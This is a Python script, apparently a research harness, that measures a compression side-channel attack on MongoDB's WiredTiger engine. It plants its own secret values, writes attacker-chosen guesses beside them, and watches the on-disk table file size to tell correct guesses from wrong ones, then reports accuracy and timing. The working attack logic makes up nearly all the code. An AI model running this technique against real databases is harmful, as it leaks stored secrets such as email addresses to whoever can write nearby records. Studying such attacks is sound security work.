from pymongo import MongoClient
import time
import os
import subprocess
import random
from datetime import datetime
import string
import sys
import numpy as np

filler_1 = ''.join(random.choices(string.ascii_uppercase, k=15))
filler_2 = ''.join(random.choices(string.ascii_uppercase, k=15))
filler_3 = ''.join(random.choices(string.ascii_uppercase, k=15))

# db_count = 0

previously_shrunk = False

def get_table_size():
     return int(subprocess.check_output(["ls", "-s", "--block-size=1", table_path]).split()[0])

def flush_and_wait_for_change():
     global old_edit_time
     client.admin.command("fsync", lock=True)
     max_sleeps = 10
     sleeps = 0
     while os.path.getmtime(table_path) == old_edit_time:
          sleeps += 1
          if sleeps > max_sleeps:
               break
          time.sleep(0.1)
     client.admin.command("fsyncUnlock")
     old_edit_time = os.path.getmtime(table_path)

def reshrink_table(compressor_size, filler_1_reset=False, db_count=0, previously_shrunk=False):
     size = get_table_size()
     # overwrite both on-disk copies of the guess string (the active and inactive one) to avoid
     # cross-guess interference
     db.test.update_one({'id' : 1}, [{'$set' : {'value' : filler_2}}])
     db_count += 1
     flush_and_wait_for_change()
     db.test.update_one({'id' : 1}, [{'$set' : {'value' : filler_3}}])
     db_count += 1
     flush_and_wait_for_change()
     if filler_1_reset:
          db.test.update_one({'id' : 3}, [{'$set' : {'value' : filler_1}}])
          db_count += 1
          flush_and_wait_for_change()
     old_size = get_table_size()
     while size <= get_table_size():
          compressor_size += 1
          if compressor_size >= 5001:
               print("over")
          db.test.update_one({'id' : 2}, [{'$set' : {'value' : compressible[:compressor_size] + non_compressible[compressor_size:]}}])
          db_count += 1
          if non_compressible[compressor_size - 1] != '*':
               flush_and_wait_for_change()
     return db_count

def find_s_no(lowBytes, highBytes, compressor, compressible, non_compressible, db_count, previously_shrunk):
     while lowBytes <= highBytes:
          size = get_table_size()
          midBytes = (lowBytes + highBytes) // 2
          db.test.update_one({'id': 2}, [{'$set' : {'value' : compressor}}])
          db_count += 1
          flush_and_wait_for_change()
          size = get_table_size()
          db.test.update_one({'id' : 2}, [{'$set' : {'value' : compressible[:midBytes] + non_compressible[midBytes:]}}])
          db_count += 1
          if non_compressible[midBytes] != '*':
            flush_and_wait_for_change()
          if size < get_table_size() or (size == get_table_size() and previously_shrunk == True):
               previously_shrunk = True
               lowBytes = midBytes + 1
          else:
               previously_shrunk = False
               highBytes = midBytes - 1
     return highBytes, previously_shrunk, db_count

client = MongoClient("localhost")
db=client.test

possibilities = []
if sys.argv[1] == "--random":
    with open("/home/britney/dbreach-britney/resources/random-dataset.txt") as f:
        for line in f:
            word = line.strip().lower()
            possibilities.append(word)
if sys.argv[1] == "--english":
    with open("/home/britney/dbreach-britney/resources/english-dataset.txt") as f:
        for line in f:
            word = line.strip().lower()
            possibilities.append(word)
if sys.argv[1] == "--emails":
    with open("/home/britney/dbreach-britney/resources/emails-dataset.txt") as f:
        for line in f:
            email = line.strip().lower()
            possibilities.append(email)

if sys.argv[2] == "--snappy":
    compressor_str = "block_compressor=snappy"
if sys.argv[2] == "--zlib":
    compressor_str = "block_compressor=zlib"

secrets_to_try = [240, 220, 200, 180, 160, 140, 120, 100, 80, 60, 40, 20, 1]
secrets_to_try = [20]
if sys.argv[3] == "--num_secrets":
    secrets_to_try = [int(a) for a in sys.argv[4:]]

for num_secrets in secrets_to_try:
    #random.shuffle(possibilities)
    for trial in range(0, 10):
        db_count = 0
        trial_possibilities = possibilities[0:num_secrets*2]
        success = False
        db.test.drop()
        db.create_collection( "test", storageEngine={'wiredTiger': { 'configString': compressor_str }})
        old_edit_time = 0
        table_path = "/var/lib/mongodb/" + db.command("collstats", "test")['wiredTiger']['uri'][17:] + ".wt"
        
        guesses = []
        correct_guesses = set()

        for secret_idx in range(num_secrets):
            secret_value = trial_possibilities[(trial + secret_idx) % len(trial_possibilities)]
            secret = {'id' : 0, 'value' : secret_value}
            db.test.insert_one(secret)
            flush_and_wait_for_change()
            guesses.append(secret_value)
            correct_guesses.add(secret_value)

        for secret_idx in range(num_secrets, num_secrets*2):
            wrong_guess = trial_possibilities[(trial + secret_idx) % len(trial_possibilities)]
            guesses.append(wrong_guess)

        fillerCharSet = string.printable.replace(string.ascii_lowercase, '').replace('*', '')
        if sys.argv[1] == "--emails":
            fillerCharSet = fillerCharSet.replace('_', '').replace('.', '').replace('@', '')

        guess_lens = set([len(guess) for guess in guesses])
        fillers_len = max(guess_lens)

        filler_1 = ''.join(random.choices(fillerCharSet, k=fillers_len))
        filler_2 = ''.join(random.choices(fillerCharSet, k=fillers_len))
        filler_3 = ''.join(random.choices(fillerCharSet, k=fillers_len))

        compressible = ''.join(['*' for _ in range(5000)])
        non_compressible = ''.join(random.choices(fillerCharSet, k=5000))

        setupStart = time.time()

        db_count = 0
        startTime = time.time()

        s_no_str = ''.join(random.choices(fillerCharSet, k=fillers_len))
        guess = {'id' : 1, 'value' : s_no_str}
        db.test.insert_one(guess)
        db_count += 1
        flush_and_wait_for_change()
        filler_row_1 = {'id' : 3, 'value' : filler_1}
        db.test.insert_one(filler_row_1)
        db_count += 1
        compressor = {'id' : 2, 'value' : compressible}
        db.test.insert_one(compressor)
        db_count += 1
        flush_and_wait_for_change()
        size = get_table_size()
        non_compress_bytes = 0
        compressor_size = len(compressible) - 0
        compressor_size, previously_shrunk, db_count = find_s_no(0, compressor_size-1, compressor, compressible, non_compressible, db_count, previously_shrunk)
        non_compress_bytes += 5000 - compressor_size
        s_no = non_compress_bytes

        s_yeses = dict()
        s_yes_max = 0

        for glen in guess_lens:
            # calculate s_yes:
            s_yes_str = ''.join(random.choices(fillerCharSet, k=glen))
            # insert s_yes as guess:
            db.test.update_one({'id': 1}, [{'$set' : {'value' : s_yes_str}}])
            db_count += 1
            flush_and_wait_for_change()

            # add copy of s_yes_str to simulate correct guess:
            db.test.update_one({'id' : 3}, [{'$set' : {'value' : s_yes_str}}])
            db_count += 1
            flush_and_wait_for_change()

            # calc compressibility score s_yes_glen
            db.test.update_one({'id' : 2}, [{'$set' : {'value' : compressible}}])
            db_count += 1
            flush_and_wait_for_change()
            size = get_table_size()
            non_compress_bytes = s_no
            compressor_size = len(compressible) - s_no
            while size >= get_table_size():
                    non_compress_bytes += 1
                    compressor_size -= 1
                    db.test.update_one({'id' : 2}, [{'$set' : {'value' : compressible[:compressor_size] + non_compressible[compressor_size:]}}])
                    db_count += 1
                    if non_compressible[compressor_size] != '*':
                            flush_and_wait_for_change()
            s_yeses[glen] = non_compress_bytes
            if non_compress_bytes > s_yes_max:
                s_yes_max = non_compress_bytes

            db_count = reshrink_table(compressor_size, filler_1_reset=True, db_count=db_count, previously_shrunk=previously_shrunk)

        setupEnd = time.time()


        scores = []
        for name in guesses:
             db.test.update_one({'id':1}, [{'$set' : {'value' : name}}])
             db_count += 1
             flush_and_wait_for_change()
             db.test.update_one({'id':2}, [{'$set' : {'value' : compressible}}])
             db_count += 1
             flush_and_wait_for_change()
             size = get_table_size()
             non_compress_bytes = s_no - 5
             compressor_size = len(compressible) - (s_no - 5)
             while size >= get_table_size():
                     non_compress_bytes += 1
                     compressor_size -= 1
                     db.test.update_one({'id' : 2}, [{'$set' : {'value' : compressible[:compressor_size] + non_compressible[compressor_size:]}}])
                     db_count += 1
                     if non_compressible[compressor_size] != '*':
                             flush_and_wait_for_change()
             scores.append((non_compress_bytes, name))
             reshrink_table(compressor_size, db_count=db_count)

        end = time.time()
        endTime = time.time()
        refScores = [(g, (s_no, s, s_yeses[len(g)])) for s, g in scores]
        for guess, score_tuple in refScores:
            label = 1 if guess in correct_guesses else 0
            print(str(label)+","+str(num_secrets)+","+str(score_tuple[0])+","+str(score_tuple[1])+","+str(score_tuple[2]) +","+str(setupEnd - setupStart)+","+str((end-setupEnd)/num_secrets) +","+str(s_yes_max))
        print("Number of DB Queries This Round: " + str(db_count))
        print("Time per round: " + str(endTime-startTime))